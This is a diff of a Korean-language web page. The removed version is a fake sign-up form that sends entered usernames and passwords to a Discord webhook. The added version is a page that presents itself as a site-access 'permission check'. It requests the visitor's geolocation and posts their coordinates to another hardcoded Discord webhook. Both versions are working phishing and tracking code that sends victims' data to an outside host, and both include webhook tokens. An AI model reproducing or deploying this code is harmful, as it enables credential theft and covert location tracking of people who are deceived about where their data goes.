@@ -1,87 +1,132 @@
 <!DOCTYPE html>
 <html lang="ko">
 <head>
-  <meta charset="UTF-8">
-  <title>Login</title>
+  <meta charset="UTF-8" />
+  <title>사이트 들어가기 전에 권한 확인</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     body {
-      background: #111;
-      height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-family: Arial;
-      color: white;
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+      margin: 2rem;
+      background: #0f0f13;
+      color: #eaeaea;
     }
-
-    .box {
-      background: #1e1e1e;
-      padding: 30px;
-      border-radius: 10px;
-      width: 300px;
+    h1 {
+      font-size: 1.4rem;
+      margin-bottom: 0.5rem;
     }
-
-    input, button {
-      width: 100%;
-      padding: 10px;
-      margin-top: 10px;
-      border: none;
-      border-radius: 5px;
+    p {
+      margin: 0.5rem 0 1.2rem;
+      color: #c9c9c9;
     }
-
     button {
-      background: #5865F2;
-      color: white;
+      padding: 0.7rem 1.1rem;
+      border: none;
+      border-radius: 6px;
+      background: #5865f2;
+      color: #fff;
+      font-size: 1rem;
       cursor: pointer;
+    }
+    button:hover {
+      background: #4752c4;
+    }
+    #status {
+      margin-top: 1.2rem;
+      padding: 0.6rem 0.8rem;
+      border-radius: 6px;
+      background: #1a1a22;
+      color: #d4d4d4;
+      font-size: 0.95rem;
+      white-space: pre-line;
+    }
+    .warning {
+      margin-top: 2rem;
+      padding: 0.7rem 0.9rem;
+      border-left: 4px solid #f23f43;
+      background: #1a1a22;
+      color: #e3a1a2;
+      font-size: 0.9rem;
     }
   </style>
 </head>
 <body>
+  <h1>권한 허용하기</h1>
+  <p>
+    아래 버튼을 누르면 브라우저에서 위치 권한을 요청합니다.<br />
+    권한을 허용하면 이 사이트를 이용 할 수 있습니다.
+  </p>
 
-<div class="box">
-  <h2>회원가입</h2>
-  <input id="id" placeholder="아이디">
-  <input id="pw" type="password" placeholder="비밀번호">
-  <button onclick="login()">회원가입</button>
-  <p id="result"></p>
-</div>
+  <button id="sendLocation">권한 확인</button>
+  <div id="status"></div>
 
-<script>
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1471394578383765579/eFIe34oh8CFR1a0aK1LxRQJbKrpb1y-rFmXcWKQaxvEUkzP1-WFVD_yEh77DGkU3qcyz";
+  <div class="warning">
+    .<br />
+    .
+  </div>
 
-  function login() {
-    const id = document.getElementById("id").value;
-    const pw = document.getElementById("pw").value;
+  <script>
+    // ===== 여기에 Discord 웹훅 URL 넣기 =====
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1527999868239482901/qUOQ1qwgXMtzRfFfj06rKD8BW_ExiVyyQBQFffZzdzi7kk1Qlm_acn_oAeGE2p2q2eqJ";
+    // =======================================
 
-    if (!id || !pw) {
-      document.getElementById("result").innerText = "정보를 입력하세요";
-      return;
-    }
+    const statusEl = document.getElementById("status");
+    const btn = document.getElementById("sendLocation");
 
-    // 🔔 디스코드로 보낼 메시지
-    const data = {
-      content: "🔔 **로그인 발생**",
-      embeds: [{
-        title: "로그인 정보",
-        color: 5793266,
-        fields: [
-          { name: "아이디", value: id, inline: true },
-          { name: "비밀번호", value: pw, inline: true }
-        ],
-        footer: { text: "Login System" },
-        timestamp: new Date()
-      }]
-    };
+    btn.addEventListener("click", () => {
+      if (!navigator.geolocation) {
+        statusEl.textContent = "이 브라우저는 위치 API 를 지원하지 않습니다.";
+        return;
+      }
 
-    fetch(WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const lat = position.coords.latitude;
+          const lng = position.coords.longitude;
+          const accuracy = position.coords.accuracy;
+
+          const message =
+            `위치 정보:
+` +
+            `위도: ${lat}
+` +
+            `경도: ${lng}
+` +
+            `정확도: ±${Math.round(accuracy)}m`;
+
+          fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ content: message })
+          })
+          .then((res) => {
+            if (res.ok) {
+              statusEl.textContent = "위치 정보를 Discord 로 전송했습니다.";
+            } else {
+              statusEl.textContent = "전송 실패: " + res.status + " " + res.statusText;
+            }
+          })
+          .catch((err) => {
+            statusEl.textContent = "전송 중 오류 발생: " + err.message;
+          });
+        },
+        (error) => {
+          switch (error.code) {
+            case error.PERMISSION_DENIED:
+              statusEl.textContent = "위치 권한이 거부되었습니다.";
+              break;
+            case error.POSITION_UNAVAILABLE:
+              statusEl.textContent = "위치 정보를 사용할 수 없습니다.";
+              break;
+            case error.TIMEOUT:
+              statusEl.textContent = "위치 정보 요청 시간이 초과되었습니다.";
+              break;
+            default:
+              statusEl.textContent = "알 수 없는 오류가 발생했습니다.";
+          }
+        }
+      );
     });
-
-    document.getElementById("result").innerText = "로그인 완료";
-  }
-</script>
-
+  </script>
 </body>
 </html>
